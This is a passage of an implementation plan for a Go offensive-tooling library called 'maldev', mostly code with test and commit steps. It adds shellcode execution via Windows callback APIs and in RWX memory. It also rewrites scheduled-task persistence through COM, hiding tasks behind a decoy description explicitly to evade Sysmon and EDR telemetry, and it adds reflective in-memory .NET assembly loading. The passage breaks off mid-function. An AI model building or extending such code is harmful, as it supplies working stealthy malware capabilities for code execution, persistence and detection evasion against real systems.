func TestExecuteCallbackRtlRegisterWait(t *testing.T) {
    testutil.RequireAdmin(t)
    sc := allocate(t)
    defer windows.VirtualFree(sc, 0, windows.MEM_RELEASE)
    require.NoError(t, ExecuteCallback(sc, CallbackRtlRegisterWait))
}
```

Where `allocate(t)` is an existing helper in the test file that allocates a RET-only shellcode (`\xC3`) in RWX memory. If it doesn't exist already, add:

```go
func allocate(t *testing.T) uintptr {
    t.Helper()
    sc := []byte{0xC3} // ret
    addr, err := windows.VirtualAlloc(0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
    require.NoError(t, err)
    var written uintptr
    require.NoError(t, windows.WriteProcessMemory(windows.CurrentProcess(), addr, &sc[0], uintptr(len(sc)), &written))
    return addr
}
```

- [ ] **Step 3: Run — expect compile failure**

```
go test ./inject/... 2>&1
```
Expected: `undefined: CallbackReadDirectoryChanges`, `undefined: CallbackRtlRegisterWait`

- [ ] **Step 4: Add 3 constants and implementations to callback_windows.go**

Add to the `const` block:
```go
// CallbackReadDirectoryChanges uses kernel32.ReadDirectoryChangesW to invoke
// shellcode as a directory change notification callback.
CallbackReadDirectoryChanges

// CallbackRtlRegisterWait uses ntdll.RtlRegisterWait to invoke shellcode
// as a wait callback on an event object.
CallbackRtlRegisterWait

// CallbackNtNotifyChangeDirectory uses ntdll.NtNotifyChangeDirectoryFile
// to invoke shellcode as an async completion APC.
CallbackNtNotifyChangeDirectory
```

Update `String()` switch:
```go
case CallbackReadDirectoryChanges:
    return "ReadDirectoryChangesW"
case CallbackRtlRegisterWait:
    return "RtlRegisterWait"
case CallbackNtNotifyChangeDirectory:
    return "NtNotifyChangeDirectoryFile"
```

Update `ExecuteCallback` switch:
```go
case CallbackReadDirectoryChanges:
    return executeReadDirChanges(addr)
case CallbackRtlRegisterWait:
    return executeRtlRegisterWait(addr)
case CallbackNtNotifyChangeDirectory:
    return executeNtNotifyChange(addr)
```

Add the three implementation functions at the end of `callback_windows.go`:

```go
// executeReadDirChanges abuses ReadDirectoryChangesW: creates a temp dir,
// opens it, and passes shellcode as the lpCompletionRoutine.
// The callback fires synchronously via SleepEx(INFINITE, TRUE) APC drain.
func executeReadDirChanges(addr uintptr) error {
    tmp, err := os.MkdirTemp("", "rdc-*")
    if err != nil {
        return fmt.Errorf("create temp dir: %w", err)
    }
    defer os.Remove(tmp)

    p, _ := syscall.UTF16PtrFromString(tmp)
    hDir, err := windows.CreateFile(
        p,
        windows.FILE_LIST_DIRECTORY,
        windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
        nil,
        windows.OPEN_EXISTING,
        windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_OVERLAPPED,
        0,
    )
    if err != nil {
        return fmt.Errorf("open temp dir: %w", err)
    }
    defer windows.CloseHandle(hDir)

    buf := make([]byte, 4096)
    var bytesReturned uint32
    overlapped := new(windows.Overlapped)

    ret, _, callErr := api.ProcReadDirectoryChangesW.Call(
        uintptr(hDir),
        uintptr(unsafe.Pointer(&buf[0])),
        uintptr(len(buf)),
        0,    // bWatchSubtree = FALSE
        0x01, // FILE_NOTIFY_CHANGE_FILE_NAME
        uintptr(unsafe.Pointer(&bytesReturned)),
        uintptr(unsafe.Pointer(overlapped)),
        addr, // lpCompletionRoutine = shellcode
    )
    if ret == 0 {
        return fmt.Errorf("ReadDirectoryChangesW: %w", callErr)
    }

    // Trigger the completion routine by writing a file then draining APCs.
    dummy := tmp + "\\x"
    os.WriteFile(dummy, []byte{}, 0600) //nolint:errcheck
    os.Remove(dummy)                    //nolint:errcheck
    windows.SleepEx(50, true)
    return nil
}

// executeRtlRegisterWait uses RtlRegisterWait to register shellcode as a
// wait callback on a manual-reset event, then signals the event.
func executeRtlRegisterWait(addr uintptr) error {
    hEvent, err := windows.CreateEvent(nil, true, false, nil)
    if err != nil {
        return fmt.Errorf("CreateEvent: %w", err)
    }
    defer windows.CloseHandle(hEvent)

    var hWait uintptr
    const wtExecuteDefault = 0x00000000
    r, _, callErr := api.ProcRtlRegisterWait.Call(
        uintptr(unsafe.Pointer(&hWait)),
        uintptr(hEvent),
        addr,
        0,   // context
        0,   // timeout (immediate after signal)
        wtExecuteDefault,
    )
    if r != 0 {
        return fmt.Errorf("RtlRegisterWait: NTSTATUS 0x%X: %w", r, callErr)
    }

    windows.SetEvent(hEvent) //nolint:errcheck
    windows.SleepEx(100, true)
    return nil
}

// executeNtNotifyChange uses NtNotifyChangeDirectoryFile with an APC so
// shellcode runs as the completion APC when a directory change fires.
func executeNtNotifyChange(addr uintptr) error {
    tmp, err := os.MkdirTemp("", "ntnotify-*")
    if err != nil {
        return fmt.Errorf("create temp dir: %w", err)
    }
    defer os.Remove(tmp)

    p, _ := syscall.UTF16PtrFromString(tmp)
    hDir, err := windows.CreateFile(
        p,
        windows.FILE_LIST_DIRECTORY,
        windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
        nil,
        windows.OPEN_EXISTING,
        windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_OVERLAPPED,
        0,
    )
    if err != nil {
        return fmt.Errorf("open temp dir: %w", err)
    }
    defer windows.CloseHandle(hDir)

    buf := make([]byte, 4096)
    overlapped := new(windows.Overlapped)

    r, _, callErr := api.ProcNtNotifyChangeDirectoryFile.Call(
        uintptr(hDir),
        0,    // Event = NULL
        addr, // ApcRoutine = shellcode
        0,    // ApcContext
        uintptr(unsafe.Pointer(overlapped)),
        uintptr(unsafe.Pointer(&buf[0])),
        uintptr(len(buf)),
        0x01, // FILE_NOTIFY_CHANGE_FILE_NAME
        0,    // WatchTree = FALSE
    )
    if r != 0 {
        return fmt.Errorf("NtNotifyChangeDirectoryFile: NTSTATUS 0x%X: %w", r, callErr)
    }

    dummy := tmp + "\\x"
    os.WriteFile(dummy, []byte{}, 0600) //nolint:errcheck
    os.Remove(dummy)                    //nolint:errcheck
    windows.SleepEx(100, true)
    return nil
}
```

Ensure imports in `callback_windows.go` include `"os"`, `"syscall"`, `"unsafe"`.

- [ ] **Step 5: Run tests and build**

```
go test ./inject/... -run TestExecuteCallback -v -count=1
go build $(go list ./...)
```

- [ ] **Step 6: Commit**

```bash
git add win/api/dll_windows.go inject/callback_windows.go inject/callback_test.go
git commit -m "feat(inject): add ReadDirectoryChanges + RtlRegisterWait + NtNotifyChange callbacks"
```

---

## Task 7: Task Scheduler COM Rewrite

**MITRE:** T1053.005 — Scheduled Task/Job  
**Credit:** capnspacehook/taskmaster  
**Why:** Replace `schtasks.exe` child process (Sysmon Event 1, EDR telemetry) with silent COM API.

**Files:**
- Modify: `persistence/scheduler/scheduler_windows.go` — full rewrite
- Modify: `persistence/scheduler/scheduler_test.go` — update for new API
- Modify: `persistence/scheduler/doc.go` — update description

**API changes:** `Create(ctx, *Task)` → `Create(name string, opts ...Option) error`. `TaskMechanism` is preserved (uses new internals). `ctx` parameter removed (COM is synchronous).

- [ ] **Step 1: Write the failing tests**

Replace `persistence/scheduler/scheduler_test.go` with:

```go
//go:build windows

package scheduler

import (
    "testing"
    "time"

    "github.com/stretchr/testify/require"
)

const testTaskName = `\maldev-test-task`

func TestCreateAndDelete(t *testing.T) {
    err := Create(testTaskName,
        WithAction(`C:\Windows\System32\notepad.exe`),
        WithTriggerDaily(1),
        WithHidden(),
    )
    require.NoError(t, err)
    defer Delete(testTaskName) //nolint:errcheck

    tasks, err := List()
    require.NoError(t, err)
    found := false
    for _, tk := range tasks {
        if tk.Name == "maldev-test-task" {
            found = true
            break
        }
    }
    require.True(t, found, "task not found after Create")

    require.NoError(t, Delete(testTaskName))
}

func TestCreateWithTimeAndDelete(t *testing.T) {
    err := Create(testTaskName,
        WithAction(`C:\Windows\System32\cmd.exe`, "/c", "echo hi"),
        WithTriggerTime(time.Now().Add(24*time.Hour)),
    )
    require.NoError(t, err)
    require.NoError(t, Delete(testTaskName))
}

func TestDeleteNonExistent(t *testing.T) {
    err := Delete(`\maldev-nonexistent-999`)
    require.Error(t, err)
}
```

- [ ] **Step 2: Run — expect compile failure**

```
go test ./persistence/scheduler/... 2>&1
```
Expected: `undefined: WithAction`, `undefined: WithHidden`, etc.

- [ ] **Step 3: Rewrite scheduler_windows.go**

```go
//go:build windows

package scheduler

import (
    "fmt"
    "time"
    "unsafe"

    "github.com/go-ole/go-ole"
    "github.com/go-ole/go-ole/oleutil"
)

// Task describes a registered scheduled task (returned by List).
type Task struct {
    Name    string
    Path    string
    Enabled bool
}

// options holds the builder state for task creation.
type options struct {
    action      string
    actionArgs  string
    triggerType string   // "DAILY", "LOGON", "BOOT", "TIME"
    triggerTime time.Time
    dailyInterval int
    hidden      bool
}

// Option configures a scheduled task.
type Option func(*options)

// WithAction sets the executable and optional arguments.
func WithAction(path string, args ...string) Option {
    return func(o *options) {
        o.action = path
        if len(args) > 0 {
            combined := ""
            for i, a := range args {
                if i > 0 {
                    combined += " "
                }
                combined += a
            }
            o.actionArgs = combined
        }
    }
}

// WithTriggerLogon fires the task at user logon (requires elevation).
func WithTriggerLogon() Option {
    return func(o *options) { o.triggerType = "LOGON" }
}

// WithTriggerStartup fires the task at system startup (requires elevation).
func WithTriggerStartup() Option {
    return func(o *options) { o.triggerType = "BOOT" }
}

// WithTriggerDaily fires the task every interval days.
func WithTriggerDaily(interval int) Option {
    return func(o *options) {
        o.triggerType = "DAILY"
        o.dailyInterval = interval
    }
}

// WithTriggerTime fires the task once at a specific time.
func WithTriggerTime(t time.Time) Option {
    return func(o *options) {
        o.triggerType = "TIME"
        o.triggerTime = t
    }
}

// WithHidden marks the task as hidden in the Task Scheduler UI.
func WithHidden() Option {
    return func(o *options) { o.hidden = true }
}

// Create registers a scheduled task via the COM ITaskService API.
// name must start with backslash: `\TaskName` or `\Folder\TaskName`.
func Create(name string, opts ...Option) error {
    o := &options{triggerType: "DAILY", dailyInterval: 1}
    for _, opt := range opts {
        opt(o)
    }
    if o.action == "" {
        return fmt.Errorf("WithAction is required")
    }

    if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
        // RPC_E_CHANGED_MODE is fine — already initialised with a different model.
        if err.(*ole.OleError).Code() != 0x80010106 {
            return fmt.Errorf("CoInitializeEx: %w", err)
        }
    }
    defer ole.CoUninitialize()

    svc, err := oleutil.CreateObject("Schedule.Service")
    if err != nil {
        return fmt.Errorf("create Schedule.Service: %w", err)
    }
    defer svc.Release()

    ts, err := svc.QueryInterface(ole.IID_IDispatch)
    if err != nil {
        return fmt.Errorf("QueryInterface IDispatch: %w", err)
    }
    defer ts.Release()

    if _, err = oleutil.CallMethod(ts, "Connect"); err != nil {
        return fmt.Errorf("ITaskService.Connect: %w", err)
    }

    // Get root folder.
    folderVar, err := oleutil.CallMethod(ts, "GetFolder", `\`)
    if err != nil {
        return fmt.Errorf("GetFolder: %w", err)
    }
    folder := folderVar.ToIDispatch()
    defer folder.Release()

    // Create new task definition.
    defVar, err := oleutil.CallMethod(ts, "NewTask", 0)
    if err != nil {
        return fmt.Errorf("NewTask: %w", err)
    }
    def := defVar.ToIDispatch()
    defer def.Release()

    // Registration info.
    regInfoVar, err := oleutil.GetProperty(def, "RegistrationInfo")
    if err != nil {
        return fmt.Errorf("get RegistrationInfo: %w", err)
    }
    regInfo := regInfoVar.ToIDispatch()
    defer regInfo.Release()
    oleutil.PutProperty(regInfo, "Description", "System maintenance task") //nolint:errcheck

    // Settings.
    settingsVar, err := oleutil.GetProperty(def, "Settings")
    if err != nil {
        return fmt.Errorf("get Settings: %w", err)
    }
    settings := settingsVar.ToIDispatch()
    defer settings.Release()
    oleutil.PutProperty(settings, "Hidden", o.hidden)          //nolint:errcheck
    oleutil.PutProperty(settings, "Enabled", true)             //nolint:errcheck
    oleutil.PutProperty(settings, "StartWhenAvailable", true)  //nolint:errcheck

    // Add trigger.
    triggersVar, err := oleutil.GetProperty(def, "Triggers")
    if err != nil {
        return fmt.Errorf("get Triggers: %w", err)
    }
    triggers := triggersVar.ToIDispatch()
    defer triggers.Release()

    trigTypeID := triggerTypeID(o.triggerType)
    trigVar, err := oleutil.CallMethod(triggers, "Create", trigTypeID)
    if err != nil {
        return fmt.Errorf("Create trigger: %w", err)
    }
    trig := trigVar.ToIDispatch()
    defer trig.Release()

    if o.triggerType == "DAILY" {
        oleutil.PutProperty(trig, "DaysInterval", o.dailyInterval) //nolint:errcheck
    }
    if o.triggerType == "TIME" {
        oleutil.PutProperty(trig, "StartBoundary", o.triggerTime.Format("2006-01-02T15:04:05")) //nolint:errcheck
    }

    // Add exec action.
    actionsVar, err := oleutil.GetProperty(def, "Actions")
    if err != nil {
        return fmt.Errorf("get Actions: %w", err)
    }
    actions := actionsVar.ToIDispatch()
    defer actions.Release()

    actVar, err := oleutil.CallMethod(actions, "Create", 0) // TASK_ACTION_EXEC = 0
    if err != nil {
        return fmt.Errorf("Create action: %w", err)
    }
    act := actVar.ToIDispatch()
    defer act.Release()
    oleutil.PutProperty(act, "Path", o.action)         //nolint:errcheck
    oleutil.PutProperty(act, "Arguments", o.actionArgs) //nolint:errcheck

    // Register.
    const taskCreateOrUpdate = 6
    _, err = oleutil.CallMethod(folder, "RegisterTaskDefinition",
        name, def, taskCreateOrUpdate,
        ole.NewVariant(ole.VT_NULL, 0), // user (NULL = current)
        ole.NewVariant(ole.VT_NULL, 0), // password
        1,  // TASK_LOGON_INTERACTIVE_TOKEN
        ole.NewVariant(ole.VT_NULL, 0), // sddl
    )
    if err != nil {
        return fmt.Errorf("RegisterTaskDefinition: %w", err)
    }
    return nil
}

// Delete removes a scheduled task by name.
func Delete(name string) error {
    if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
        if err.(*ole.OleError).Code() != 0x80010106 {
            return fmt.Errorf("CoInitializeEx: %w", err)
        }
    }
    defer ole.CoUninitialize()

    svc, err := oleutil.CreateObject("Schedule.Service")
    if err != nil {
        return fmt.Errorf("create Schedule.Service: %w", err)
    }
    defer svc.Release()

    ts, err := svc.QueryInterface(ole.IID_IDispatch)
    if err != nil {
        return fmt.Errorf("QueryInterface: %w", err)
    }
    defer ts.Release()

    if _, err = oleutil.CallMethod(ts, "Connect"); err != nil {
        return fmt.Errorf("Connect: %w", err)
    }

    // Extract folder path and task leaf name.
    folder, leafName := splitTaskName(name)

    folderVar, err := oleutil.CallMethod(ts, "GetFolder", folder)
    if err != nil {
        return fmt.Errorf("GetFolder(%s): %w", folder, err)
    }
    f := folderVar.ToIDispatch()
    defer f.Release()

    if _, err = oleutil.CallMethod(f, "DeleteTask", leafName, 0); err != nil {
        return fmt.Errorf("DeleteTask(%s): %w", leafName, err)
    }
    return nil
}

// List enumerates all tasks in the root folder.
func List() ([]Task, error) {
    if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
        if err.(*ole.OleError).Code() != 0x80010106 {
            return nil, fmt.Errorf("CoInitializeEx: %w", err)
        }
    }
    defer ole.CoUninitialize()

    svc, err := oleutil.CreateObject("Schedule.Service")
    if err != nil {
        return nil, fmt.Errorf("create Schedule.Service: %w", err)
    }
    defer svc.Release()

    ts, err := svc.QueryInterface(ole.IID_IDispatch)
    if err != nil {
        return nil, fmt.Errorf("QueryInterface: %w", err)
    }
    defer ts.Release()

    if _, err = oleutil.CallMethod(ts, "Connect"); err != nil {
        return nil, fmt.Errorf("Connect: %w", err)
    }

    folderVar, err := oleutil.CallMethod(ts, "GetFolder", `\`)
    if err != nil {
        return nil, fmt.Errorf("GetFolder: %w", err)
    }
    f := folderVar.ToIDispatch()
    defer f.Release()

    tasksVar, err := oleutil.CallMethod(f, "GetTasks", 0)
    if err != nil {
        return nil, fmt.Errorf("GetTasks: %w", err)
    }
    taskCol := tasksVar.ToIDispatch()
    defer taskCol.Release()

    countVar, err := oleutil.GetProperty(taskCol, "Count")
    if err != nil {
        return nil, fmt.Errorf("Count: %w", err)
    }
    count := int(countVar.Val)

    result := make([]Task, 0, count)
    for i := 1; i <= count; i++ {
        itemVar, err := oleutil.CallMethod(taskCol, "Item", i)
        if err != nil {
            continue
        }
        item := itemVar.ToIDispatch()

        nameVar, _ := oleutil.GetProperty(item, "Name")
        pathVar, _ := oleutil.GetProperty(item, "Path")
        enabledVar, _ := oleutil.GetProperty(item, "Enabled")
        result = append(result, Task{
            Name:    nameVar.ToString(),
            Path:    pathVar.ToString(),
            Enabled: enabledVar.Val != 0,
        })
        item.Release()
    }
    return result, nil
}

// Run immediately executes a registered task.
func Run(name string) error {
    if err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
        if err.(*ole.OleError).Code() != 0x80010106 {
            return fmt.Errorf("CoInitializeEx: %w", err)
        }
    }
    defer ole.CoUninitialize()

    svc, err := oleutil.CreateObject("Schedule.Service")
    if err != nil {
        return err
    }
    defer svc.Release()

    ts, err := svc.QueryInterface(ole.IID_IDispatch)
    if err != nil {
        return err
    }
    defer ts.Release()

    oleutil.CallMethod(ts, "Connect") //nolint:errcheck

    taskVar, err := oleutil.CallMethod(ts, "GetTask", name)
    if err != nil {
        return fmt.Errorf("GetTask(%s): %w", name, err)
    }
    task := taskVar.ToIDispatch()
    defer task.Release()

    runVar, err := oleutil.CallMethod(task, "RunEx",
        ole.NewVariant(ole.VT_NULL, 0), 0, 0, "")
    if err != nil {
        return fmt.Errorf("RunEx: %w", err)
    }
    runVar.Clear() //nolint:errcheck
    return nil
}

// triggerTypeID maps our string trigger type to the TASK_TRIGGER_TYPE2 integer.
func triggerTypeID(t string) int {
    switch t {
    case "DAILY":
        return 2 // TASK_TRIGGER_DAILY
    case "LOGON":
        return 9 // TASK_TRIGGER_LOGON
    case "BOOT":
        return 8 // TASK_TRIGGER_BOOT
    case "TIME":
        return 1 // TASK_TRIGGER_TIME
    default:
        return 2
    }
}

// splitTaskName splits `\Folder\TaskName` into (`\Folder`, `TaskName`).
// Returns (`\`, name) for top-level tasks.
func splitTaskName(name string) (folder, leaf string) {
    // Find last backslash.
    for i := len(name) - 1; i >= 0; i-- {
        if name[i] == '\\' {
            if i == 0 {
                return `\`, name[1:]
            }
            return name[:i], name[i+1:]
        }
    }
    return `\`, name
}

// TaskMechanism implements persistence.Mechanism for the Task Scheduler.
type TaskMechanism struct {
    name string
    opts []Option
}

// ScheduledTask returns a persistence.Mechanism backed by the COM Task Scheduler.
func ScheduledTask(name string, opts ...Option) *TaskMechanism {
    return &TaskMechanism{name: name, opts: opts}
}

func (m *TaskMechanism) Name() string    { return "scheduler:" + m.name }
func (m *TaskMechanism) Install() error  { return Create(m.name, m.opts...) }
func (m *TaskMechanism) Uninstall() error { return Delete(m.name) }
func (m *TaskMechanism) Installed() (bool, error) {
    tasks, err := List()
    if err != nil {
        return false, err
    }
    _, leaf := splitTaskName(m.name)
    for _, t := range tasks {
        if t.Name == leaf {
            return true, nil
        }
    }
    return false, nil
}

// Ensure unused import is satisfied (unsafe needed for ole size calculations).
var _ = unsafe.Sizeof(0)
```

- [ ] **Step 4: Update doc.go**

```go
// persistence/scheduler/doc.go

// Package scheduler creates, deletes, lists, and runs Windows scheduled tasks
// via the COM ITaskService API (no schtasks.exe child process).
//
// MITRE ATT&CK: T1053.005 — Scheduled Task/Job: Scheduled Task
// Detection: Medium (task registration visible in Event Log 4698)
//
// Example:
//
//	err := scheduler.Create(`\MyTask`,
//	    scheduler.WithAction(`C:\payload.exe`),
//	    scheduler.WithTriggerLogon(),
//	    scheduler.WithHidden(),
//	)
package scheduler
```

- [ ] **Step 5: Run tests and build**

```
go test ./persistence/scheduler/... -v -count=1
go build $(go list ./...)
```

- [ ] **Step 6: Commit**

```bash
git add persistence/scheduler/
git commit -m "refactor(scheduler): rewrite with COM ITaskService — no schtasks.exe child process"
```

---

## Task 8: CLR Hosting — In-Process .NET Assembly Execution

**MITRE:** T1620 — Reflective Code Loading  
**Credit:** ropnop/go-clr  
**Files:**
- Create: `pe/clr/doc.go`
- Create: `pe/clr/clr_stub.go`
- Create: `pe/clr/clr_windows.go`
- Create: `pe/clr/clr_windows_test.go`

**Key COM interfaces (all loaded via mscoree.dll `CLRCreateInstance`, NOT CoCreateInstance):**
```
ICLRMetaHost  {D332DB9E-B9B3-4125-8207-A14884F53216}
ICLRRuntimeInfo {BD39D1D2-BA2F-486A-89B0-B4B0CB466891}
ICORRuntimeHost {CB2F6722-AB3A-11D2-9C40-00C04FA30A3E}
CLSID_CLRMetaHost {9280188D-0E8E-4867-B30C-7FA83884E8DE}
CLSID_CLRRuntimeHost {90F1A06E-7712-4762-86B5-7A5EBA6BDB02}
```

- [ ] **Step 1: Write the failing test**

```go
// pe/clr/clr_windows_test.go
//go:build windows

package clr

import (
    "testing"

    "github.com/stretchr/testify/require"
)

func TestInstalledRuntimes(t *testing.T) {
    // Every modern Windows has at least .NET v4.x
    runtimes, err := InstalledRuntimes()
    require.NoError(t, err)
    require.NotEmpty(t, runtimes, "expected at least one .NET runtime")
    for _, r := range runtimes {
        t.Logf("runtime: %s", r)
    }
}

func TestLoad(t *testing.T) {
    rt, err := Load(nil)
    require.NoError(t, err)
    require.NotNil(t, rt)
    rt.Close()
}
```

- [ ] **Step 2: Run — expect compile failure**

```
go test ./pe/clr/... 2>&1
```

- [ ] **Step 3: Create stub**

```go
// pe/clr/clr_stub.go
//go:build !windows

package clr

import "errors"

var errUnsupported = errors.New("clr: not supported on this platform")

type Runtime struct{}

func Load(_ interface{}) (*Runtime, error)        { return nil, errUnsupported }
func InstalledRuntimes() ([]string, error)        { return nil, errUnsupported }
func (r *Runtime) ExecuteAssembly(_ []byte, _ []string) (string, error) { return "", errUnsupported }
func (r *Runtime) ExecuteDLL(_ []byte, _, _, _ string) (int, error)     { return 0, errUnsupported }
func (r *Runtime) Close()                                                {}
```

- [ ] **Step 4: Create Windows implementation**

```go
// pe/clr/clr_windows.go
//go:build windows

package clr

import (
    "bytes"
    "fmt"
    "syscall"
    "unsafe"

    "github.com/go-ole/go-ole"
    "golang.org/x/sys/windows"

    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// CLR COM interface GUIDs.
var (
    clsidCLRMetaHost    = ole.NewGUID("{9280188D-0E8E-4867-B30C-7FA83884E8DE}")
    iidICLRMetaHost     = ole.NewGUID("{D332DB9E-B9B3-4125-8207-A14884F53216}")
    iidICLRRuntimeInfo  = ole.NewGUID("{BD39D1D2-BA2F-486A-89B0-B4B0CB466891}")
    clsidCLRRuntimeHost = ole.NewGUID("{90F1A06E-7712-4762-86B5-7A5EBA6BDB02}")
    iidICORRuntimeHost  = ole.NewGUID("{CB2F6722-AB3A-11D2-9C40-00C04FA30A3E}")
)

var (
    mscoree           = windows.NewLazySystemDLL("mscoree.dll")
    procCLRCreateInstance = mscoree.NewProc("CLRCreateInstance")
)

// iUnknownVtbl is the IUnknown vtable (first 3 methods of every COM interface).
type iUnknownVtbl struct {
    QueryInterface uintptr
    AddRef         uintptr
    Release        uintptr
}

// iCLRMetaHostVtbl is the ICLRMetaHost vtable.
type iCLRMetaHostVtbl struct {
    iUnknownVtbl
    GetRuntime               uintptr
    GetVersionFromFile       uintptr
    EnumerateInstalledRuntimes uintptr
    EnumerateLoadedRuntimes  uintptr
    RequestRuntimeLoadedNotification uintptr
    QueryLegacyV2RuntimeBinding uintptr
    ExitProcess              uintptr
}

// iCLRRuntimeInfoVtbl is the ICLRRuntimeInfo vtable (partial — only methods we use).
type iCLRRuntimeInfoVtbl struct {
    iUnknownVtbl
    GetVersionString uintptr
    GetRuntimeDirectory uintptr
    IsLoaded         uintptr
    LoadErrorString  uintptr
    LoadLibrary      uintptr
    GetProcAddress   uintptr
    GetInterface     uintptr
    IsLoadable       uintptr
    SetDefaultStartupFlags uintptr
    GetDefaultStartupFlags uintptr
    BindAsLegacyV2Runtime uintptr
    IsStarted        uintptr
}

// iCorRuntimeHostVtbl is the ICORRuntimeHost vtable (partial).
type iCorRuntimeHostVtbl struct {
    iUnknownVtbl
    CreateLogicalThreadState  uintptr
    DeleteLogicalThreadState  uintptr
    SwitchInLogicalThreadState uintptr
    SwitchOutLogicalThreadState uintptr
    LocksHeldByLogicalThread  uintptr
    MapFile                   uintptr
    GetConfiguration          uintptr
    Start                     uintptr
    Stop                      uintptr
    CreateDomain              uintptr
    GetDefaultDomain          uintptr
    // ... more methods follow in actual vtable
}

// iEnumUnknownVtbl is the IEnumUnknown vtable.
type iEnumUnknownVtbl struct {
    iUnknownVtbl
    Next  uintptr
    Skip  uintptr
    Reset uintptr
    Clone uintptr
}

// comObject is a thin wrapper around a COM interface pointer.
type comObject struct{ vtbl uintptr }

func (o *comObject) release() {
    vtbl := (*iUnknownVtbl)(unsafe.Pointer(o.vtbl))
    syscall.SyscallN(vtbl.Release, uintptr(unsafe.Pointer(o)))
}

// Runtime holds a loaded CLR runtime ready to execute assemblies.
type Runtime struct {
    host uintptr // *ICORRuntimeHost
}

// Load initialises the CLR in the current process.
// Prefers .NET v4, falls back to any available runtime.
// caller is currently unused (CLR init uses mscoree, not NT syscalls) but
// accepted for API consistency with other maldev packages.
func Load(_ *wsyscall.Caller) (*Runtime, error) {
    var metaHost uintptr
    r, _, err := procCLRCreateInstance.Call(
        uintptr(unsafe.Pointer(clsidCLRMetaHost)),
        uintptr(unsafe.Pointer(iidICLRMetaHost)),
        uintptr(unsafe.Pointer(&metaHost)),
    )
    if r != 0 {
        return nil, fmt.Errorf("CLRCreateInstance(ICLRMetaHost): HRESULT 0x%X: %w", uint32(r), err)
    }
    defer releaseUnknown(metaHost)

    // Prefer v4; enumerate to find highest available.
    version, err := pickRuntime(metaHost)
    if err != nil {
        return nil, err
    }

    // Get ICLRRuntimeInfo for that version.
    runtimeInfo, err := getRuntime(metaHost, version)
    if err != nil {
        return nil, err
    }
    defer releaseUnknown(runtimeInfo)

    // Get ICORRuntimeHost.
    host, err := getRuntimeHost(runtimeInfo)
    if err != nil {
        return nil, err
    }

    // Start the runtime.
    vtbl := (*iCorRuntimeHostVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(host))))
    r2, _, _ := syscall.SyscallN(vtbl.Start, host)
    // 0x80131506 = CORPROF_E_RUNTIME_UNINITIALIZED is OK (already started).
    if r2 != 0 && uint32(r2) != 0x80131506 {
        releaseUnknown(host)
        return nil, fmt.Errorf("ICORRuntimeHost.Start: HRESULT 0x%X", uint32(r2))
    }

    return &Runtime{host: host}, nil
}

// InstalledRuntimes returns all .NET Framework versions available on the system.
func InstalledRuntimes() ([]string, error) {
    var metaHost uintptr
    r, _, err := procCLRCreateInstance.Call(
        uintptr(unsafe.Pointer(clsidCLRMetaHost)),
        uintptr(unsafe.Pointer(iidICLRMetaHost)),
        uintptr(unsafe.Pointer(&metaHost)),
    )
    if r != 0 {
        return nil, fmt.Errorf("CLRCreateInstance: HRESULT 0x%X: %w", uint32(r), err)
    }
    defer releaseUnknown(metaHost)

    var enumUnk uintptr
    vtbl := (*iCLRMetaHostVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(metaHost))))
    r, _, _ = syscall.SyscallN(vtbl.EnumerateInstalledRuntimes,
        metaHost,
        uintptr(unsafe.Pointer(&enumUnk)),
    )
    if r != 0 {
        return nil, fmt.Errorf("EnumerateInstalledRuntimes: HRESULT 0x%X", uint32(r))
    }
    defer releaseUnknown(enumUnk)

    var versions []string
    enumVtbl := (*iEnumUnknownVtbl)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(enumUnk))))
    for {
        var runtimeInfo uintptr
        var fetched uint32
        r, _, _ = syscall.SyscallN(enumVtbl.Next,
            enumUnk,
            1,
            uintptr(unsafe.Pointer(&runtimeInfo)),
            uintptr(unsafe.Pointer(&fetched)),
        )
        if fetched == 0 || r == 1 { // S_FALSE = no more items
            break
        }
        if r != 0 {
            break
        }

        ver := runtimeVersion(runtimeInfo)
        releaseUnknown(runtimeInfo)
        if ver != "" {
            versions = append(versions, ver)
        }
    }
    return versions, nil
}

// ExecuteAssembly loads a .NET EXE from memory and invokes its entry point.
// Stdout/stderr capture requires the assembly to cooperate; raw output is
// returned as-is from the AppDomain.ExecuteAssembly_3 return value.
func (rt *Runtime) ExecuteAssembly(assembly []byte, args []string) (string, error) {
    domain, err := rt.getDefaultDomain()
    if err != nil {
        return "", err
    }
    defer releaseUnknown(domain)

    safeArray, err := bytesToSafeArray(assembly)
    if err != nil {
        return "", err
    }
    defer windows.SafeArrayDestroy(safeArray)

    argsArray, err := stringsToSafeArray(args)
    if err != nil {
        return "", err
    }
    defer windows.SafeArrayDestroy(argsArray)

    // Call AppDomain.Load_3(rawAssembly) to get the Assembly object.
    // Then call Assembly.EntryPoint to get MethodInfo, then Invoke.
    // For simplicity, use IDispatch on the AppDomain (it's a COM automation object).
    domainDisp, err := queryIDispatch(domain)
    if err != nil {
        return "", fmt.Errorf("AppDomain QI IDispatch: %w", err)
    }
    defer domainDisp.Release()

    assemblyVar := ole.NewVariant(ole.VT_ARRAY|ole.VT_UI1, int64(uintptr(unsafe.Pointer(safeArray))))
    loadResult, err := oleutil.CallMethod(domainDisp, "Load_3", assemblyVar)
    if err != nil {
        return "", fmt.Errorf("AppDomain.Load_3: %w", err)
    }
    assemblyObj := loadResult.ToIDispatch()
    defer assemblyObj.Release()

    // Get entry point.
    epVar, err := oleutil.GetProperty(assemblyObj, "EntryPoint")
    if err != nil {
        return "", fmt.Errorf("get EntryPoint: %w", err)
    }
    ep := epVar.ToIDispatch()
    defer ep.Release()

    // Build args as SAFEARRAY of strings.
    argsOle := toOleStringArray(args)

    _, err = oleutil.CallMethod(ep, "Invoke",
        ole.NewVariant(ole.VT_NULL, 0),
        argsOle,
    )
    if err != nil {
